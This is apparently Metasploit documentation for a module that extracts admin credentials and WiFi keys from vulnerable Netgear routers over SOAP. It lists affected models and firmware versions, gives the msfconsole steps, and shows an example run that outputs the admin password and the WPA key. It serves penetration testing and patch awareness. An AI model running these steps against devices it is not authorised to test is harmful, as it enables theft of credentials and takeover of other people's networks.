## Vulnerable Application

The following list is a non-exhaustive list of vulnerable Netgear devices:

  1.  R6300v2  < [1.0.3.28](http://kb.netgear.com/app/answers/detail/a_id/28372)
  2.  WNDR3300 - V1.0.45 (current, confirmed vuln)
  3.  WNDR3700v1 - 1.0.7.98, 1.0.16.98 (confirmed vuln)
  4.  WNDR3700v2 - 1.0.1.14 (EOL, confirmed vuln)
  5.  WNDR3700v4 < [1.0.2.80](http://kb.netgear.com/app/answers/detail/a_id/28355)
  6.  WNDR3800 - 1.0.0.48 (EOL, confirmed vuln)
  7.  WNDR4300 < [1.0.2.80](http://kb.netgear.com/app/answers/detail/a_id/28037)
  8.  WNR1000v2 - 1.0.1.1, 1.1.2.58 (EOL, confirmed vuln)
  9.  WNR2000v3 < [1.1.2.12](http://kb.netgear.com/app/answers/detail/a_id/30024)
  10. WNR2200 < [1.0.1.96](http://kb.netgear.com/app/answers/detail/a_id/28036)
  11. WNR2500 < [1.0.0.32](http://kb.netgear.com/app/answers/detail/a_id/28351)

## Verification Steps

  1. Start msfconsole
  2. Do: ```use auxiliary/admin/http/netgear_soap_password_extractor```
  3. Do: ```set rhost <ip>```
  4. Do: ```run```
  5. You should get admin info on the device

## Scenarios

  Example run against wnr2000v3 with firmware 1.1.2.10:

```
msf > use auxiliary/admin/http/netgear_soap_password_extractor 
msf auxiliary(netgear_soap_password_extractor) > set rhost 192.168.1.1
rhost => 192.168.1.1
msf auxiliary(netgear_soap_password_extractor) > run

[*] Trying to access the configuration of the device
[*] Extracting Firmware version...
[+] Model wnr2000v3 found
[+] Firmware version V1.1.2.10 found
[+] Device details downloaded to: /root/.msf4/loot/20160706212637_default_192.168.1.1_netgear_soap_dev_000157.txt
[*] Extracting credentials...
[*] Credentials found, extracting...
[+] admin / password credentials found
[+] Account details downloaded to: /root/.msf4/loot/20160706212637_default_192.168.1.1_netgear_soap_acc_387111.txt
[*] Extracting Wifi...
[+] Wifi SSID: NETGEAR44
[+] Wifi Encryption: WPA2-PSK
[*] Extracting WPA Keys...
[+] Wifi Password: netgearpassword22
[*] Auxiliary module execution completed
```
